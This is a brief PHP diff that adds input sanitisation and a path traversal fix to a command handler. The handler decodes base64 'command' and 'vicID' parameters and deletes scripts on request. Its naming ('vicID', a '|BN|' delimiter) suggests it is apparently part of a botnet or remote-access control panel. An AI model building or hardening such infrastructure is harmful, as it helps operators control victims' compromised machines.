@@ -3,8 +3,8 @@ include_once 'classes/Database.php';
 include_once 'classes/Clients.php';
 $client = new Clients;
 $_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
-$command = base64_decode($_GET['command']);
-$ID = "'".base64_decode($_GET['vicID'])."'";
+$command = sanitizeInput(base64_decode($_GET['command']));
+$ID = "'".sanitizeInput(base64_decode($_GET['vicID']))."'";
 $data = $client->getClient(trim($ID,"'"));
 
 $A = explode("|BN|", sanitizeInput($command));
@@ -33,7 +33,7 @@ switch ($A[0]) {
 
 	case 'DeleteScript':
 		 try {
-		 	unlink("scripts/" . $A[1]);
+		    unlink(realpath(sanitizeInput("scripts/" . trim($A[1], "./"))));
 		 } catch (Exception $e) {
 		 	
 		 }
